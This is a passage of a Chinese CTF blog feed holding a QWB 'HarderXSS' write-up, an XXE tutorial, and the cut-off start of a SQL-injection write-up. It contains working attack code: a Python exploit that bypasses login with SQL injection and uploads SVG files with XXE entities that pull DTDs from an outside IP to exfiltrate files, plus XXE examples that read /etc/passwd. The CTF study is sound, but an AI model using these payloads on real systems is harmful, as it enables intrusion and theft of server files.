class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>-&gt;fetch_row())&#123;<br>        <span class="hljs-comment">// echo &quot;update avatar set img=&#x27;$filename&#x27; where userid=$_SESSION[login]&quot;;</span><br>        <span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;update avatar set img=&#x27;<span class="hljs-subst">$filename</span>&#x27; where userid=<span class="hljs-subst">$_SESSION</span>[login]&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>!==<span class="hljs-literal">TRUE</span>)&#123;<br>            <span class="hljs-comment">// echo $con-&gt;error;</span><br>            <span class="hljs-variable">$con</span>-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;update success&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-variable">$con</span>-&gt;query(<span class="hljs-string">&quot;insert into avatar values(<span class="hljs-subst">$_SESSION</span>[login],&#x27;<span class="hljs-subst">$filename</span>&#x27;)&quot;</span>);<br><span class="hljs-variable">$con</span>-&gt;commit();<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;upload success&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><p>对于上传的图像文件，对于png、jpg、bmp、gif直接读文件头识别出来后转存，对于其他文件头的按svg进行解析，解析失败的认为不是有效的图像文件返回not image。并且对xml进行了两次（不是两步）解析，第一次解析的时候<code>loadxml(LIBXML_DTDLOAD)</code>，没有LIBXML_DTDVAILD不会从参数实体文件读取内容(%file 不会被读入，如下图所示)，能够防止被本地文件被读取，也能防止js被外部引入。</p><p>这个要注意的是外带数据的如果是参数实体，要注意你服务器返回的得是合法的xml或者空白。</p><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>通过<code>serviceWorker</code>来截取浏览器的请求，借鉴了西湖论剑的那个题解，西湖的那个题解现在我也看不懂….</p><h3 id="Service-Worker简介"><a href="#Service-Worker简介" class="headerlink" title="Service Worker简介"></a>Service Worker简介</h3><ul><li>Appcache用来处理网站的离线缓存，可以通过manifest文件指定浏览器缓存哪些文件以供离线访问。但Appcache有相当多的缺陷，对于整站中的多页缓存来说支持比较差，而Service Worker用来作为其替代。</li><li>Service Worker是浏览器在后台运行的脚本，与web页面分离，以更好地支持不需要web页面或用户交互的功能。也可以将其理解为一个介于客户端和服务端之间的代理服务器，拥有<strong>拦截请求、修改返回内容</strong>的权力。可以用来缓存并处理离线网页（用来XSS）。</li><li>Service Workers 要求<strong>必须在 HTTPS 下才能运行</strong>。为了便于本地开发，<strong>localhost</strong> 也被浏览器认为是安全源。</li><li>Service Workers<strong>没有访问 DOM 的能力</strong>。</li></ul><p>剩下的放张图，属实对xss这一快还不太会</p><p><img src="https://img-blog.csdnimg.cn/0c542dea2e5240bd9a145042b677df13.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>这是借鉴天枢的解法</p><p>直接拿exp吧，中间有我很多尝试的svg</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span>  re<br><span class="hljs-keyword">import</span>  base64<br>url = <span class="hljs-string">&#x27;http://7f02f7e5-c929-4078-9f06-5e6c4acea6db.node4.buuoj.cn/&#x27;</span><br>svg = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY[</span><br><span class="hljs-string">&lt;!ENTITY % secret SYSTEM &quot;http://39.107.239.30:80/1.php&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % visit_hacker SYSTEM &quot;http://39.107.239.30:80/xxe2.xml&quot;&gt;</span><br><span class="hljs-string">%visit_hacker;</span><br><span class="hljs-string">%hacker;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;hacker&gt;&amp;sending;&lt;/hacker&gt;&quot;&quot;&quot;</span><br>svg2 = <span class="hljs-string">b&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE message [</span><br><span class="hljs-string">    &lt;!ENTITY % remote SYSTEM &quot;http://39.107.239.30:80/dtd&quot;&gt;  </span><br><span class="hljs-string">    %remote;</span><br><span class="hljs-string">    %start;</span><br><span class="hljs-string">    %send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="hljs-string">&lt;/svg&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># b&quot;&quot;&quot;&lt;!-- test.jpg --&gt;</span><br><span class="hljs-comment"># &lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="hljs-comment"># &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="hljs-comment"># &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="hljs-comment"># &lt;html&gt;</span><br><span class="hljs-comment"># &lt;head&gt;&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;&lt;/head&gt;</span><br><span class="hljs-comment"># &lt;body&gt;</span><br><span class="hljs-comment"># &lt;svg style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1);&quot;&gt;&lt;/svg&gt;</span><br><span class="hljs-comment"># &lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-comment"># &lt;/xsl:template&gt;</span><br><span class="hljs-comment"># &lt;/xsl:stylesheet&gt;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># &quot;&quot;&quot;</span><br>svg3 = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE svg [</span><br><span class="hljs-string">&lt;!ELEMENT svg ANY &gt;</span><br><span class="hljs-string">&lt;!ENTITY % sp SYSTEM &quot;http://39.107.239.30:80/xxe.xml&quot;&gt;</span><br><span class="hljs-string">%sp;</span><br><span class="hljs-string">%param1;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;svg viewBox=&quot;0 0 200 200&quot; version=&quot;1.2&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; style=&quot;fill:red&quot;&gt;</span><br><span class="hljs-string">      &lt;text x=&quot;15&quot; y=&quot;100&quot; style=&quot;fill:black&quot;&gt;XXE via SVG rasterization&lt;/text&gt;</span><br><span class="hljs-string">      &lt;rect x=&quot;0&quot; y=&quot;0&quot; rx=&quot;10&quot; ry=&quot;10&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:pink;opacity:0.7&quot;/&gt;</span><br><span class="hljs-string">      &lt;flowRoot font-size=&quot;15&quot;&gt;</span><br><span class="hljs-string">         &lt;flowRegion&gt;</span><br><span class="hljs-string">           &lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;200&quot; height=&quot;200&quot; style=&quot;fill:red;opacity:0.3&quot;/&gt;</span><br><span class="hljs-string">         &lt;/flowRegion&gt;</span><br><span class="hljs-string">         &lt;flowDiv&gt;</span><br><span class="hljs-string">            &lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;</span><br><span class="hljs-string">         &lt;/flowDiv&gt;</span><br><span class="hljs-string">      &lt;/flowRoot&gt;</span><br><span class="hljs-string">&lt;/svg&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>s = requests.Session()<br>s.cookies[<span class="hljs-string">&quot;PHPSESSID&quot;</span>]= <span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span><br>res = s.post(url+<span class="hljs-string">&#x27;login/login.php&#x27;</span>,<br>             data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&#x27;or(1=1)#&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;,<br>             headers=&#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><br>res2 = s.post(url=url+<span class="hljs-string">&#x27;user/upload.php&#x27;</span>,<br>              data=&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">b&quot;data:image/svg+xml;base64,&quot;</span>+base64.b64encode(svg2)&#125;,<br>              cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(res2.text)<br><span class="hljs-built_in">print</span>(base64.b64encode(svg))<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res2.text:<br>    exit(<span class="hljs-number">1</span>)<br>res3 = s.get(url=url+<span class="hljs-string">&#x27;user/&#x27;</span>,cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;9nas0jatppeftralq58d60apre&quot;</span>&#125;)<br><span class="hljs-comment"># print(res3.text)</span><br><br>u = re.findall(<span class="hljs-string">r&#x27;&lt;embed id=&quot;prebox&quot; src=&quot;\/upload\/([0-9a-zA-z]+)&quot;&#x27;</span>,res3.text)<br>u = <span class="hljs-string">&quot;upload/&quot;</span>+u[<span class="hljs-number">0</span>]<br><br>res4 = s.get(url=url+u).text<br><span class="hljs-built_in">print</span>(res4)<br><br><br><br><br><br></code></pre></div></td></tr></table></figure><p>后面改了一下脚本竟然拿到了，真是太不容易了，才发现好像不一定是非要<code>sucesss</code>才行。</p><p><img src="https://img-blog.csdnimg.cn/4e93e126baa046e091b1f44aa092420a.png" alt="在这里插入图片描述"></p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;script &gt;<br><span class="hljs-built_in">document</span>.domain=<span class="hljs-string">&quot;cubestone.com&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pageload</span>(<span class="hljs-params">data</span>)</span>&#123;<br>    <span class="hljs-built_in">document</span>.body.innerText=data;<br>&#125;<br>fetch(<span class="hljs-string">`loader.php?callback=pageload&amp;secret=cube`</span>).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<span class="hljs-keyword">return</span> res.text();&#125;).then(<span class="hljs-function">(<span class="hljs-params">data</span>)=&gt;</span>&#123;<span class="hljs-built_in">eval</span>(data);&#125;)&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>拿到<code>upload.php</code>源码</p><p><img src="https://img-blog.csdnimg.cn/153fad9a5b104fbe97463dc162a71b5b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接着又试了下天枢的那个方法，通了，太痛苦了呜呜呜，是我xml中的dtd中有个地方多写了个<code>/</code>，啊这题看了两天太痛苦了。</p><p>读到了<code>/etc/passwd</code></p><p><img src="https://img-blog.csdnimg.cn/0641ecd64f854cd5a2a416bd2bc10752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这就实现了任意文件读取了~~</p><p><img src="https://img-blog.csdnimg.cn/91ab5f2234bf4317bf61d64f06e0c848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>flag&#123;632e6e01-d5aa-400a-9f91-bc3c4856fc96&#125;</code>。</p><p>终于做出来了，这两天学xxe也学到了很多，虽然有个小错误浪费了我很多时间，但找错误的过程也学了很多，这个暑假把XSS的知识得好好学学，还有JS的代码也得认真学学了，西湖论剑的那个方法还没咋看懂，再学学js再看。</p><p>参考文章</p><p><a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html">https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20201019-sw_safe.html</a></p><p><a href="https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/">https://blog.funnything.net/2021/06/15/2021-qwb-web-harderxss-writeup/</a></p><p><a href="https://www.icystal.top/ctf15-qwb2021harderxss/">https://www.icystal.top/ctf15-qwb2021harderxss/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/20/2021-7-21-XXE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE学习"><a href="#XXE学习" class="headerlink" title="XXE学习"></a>XXE学习</h1><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><h4 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h4><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p><p>第一行XML的声明，第二行<note> 为根元素， 下面的to, from,heading和body 都是子元素</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  //XML声明<br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>  //文档类型定义<br>    <br>//文档元素<br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 有两种声明的方法，一种是内部声明，一种是外部声明，我们下面开具体看一下：</p><p>DTD的内部声明：根元素 [元素声明]&gt;： </p><p>例如<!DOCTYOE test any></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Tove<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>Jani<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>外部声明 根元素 SYSTEM “文件名”&gt; 或 根元素 PUBLIC “public_ID” “文件名”&gt; </p><p>例如<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;note.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>George<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>John<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>Reminder<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h4 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h4><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<br>引用实体的方式：&amp;实体名<br>2，参数实体只能在DTD中使用，参数实体的声明格式：<br>引用实体的方式：%实体名</p><p>内部实体声明: ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-string">&quot;Bill Gates&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>引用外部实体：</p><p><code>实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">writer</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">copyright</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h3><p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><p>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为TRUE来禁用外部实体，从而起到防御的目的。</p><h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h4><p>通过DTD外部实体声明:</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>通过DTDy引入外部DTD再引入外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;b;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY b <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>不同程序支持的协议不同</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d408adb6e9e833ca14fb08b299914c16.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QWB托纳多</title>
    <link href="/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/"/>
    <url>/2021/07/16/2021-7-16-QWB%E6%89%98%E7%BA%B3%E5%A4%9A/</url>
    
    <content type="html"><![CDATA[<h2 id="QWB托纳多"><a href="#QWB托纳多" class="headerlink" title="QWB托纳多"></a>QWB托纳多</h2><p>注册页面存在注入，利用processlist表读取正在执行的sql语句，从而得到表名与列名。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-comment"># string = string.ascii_letters + string.digits</span><br><span class="hljs-comment"># print(string)</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 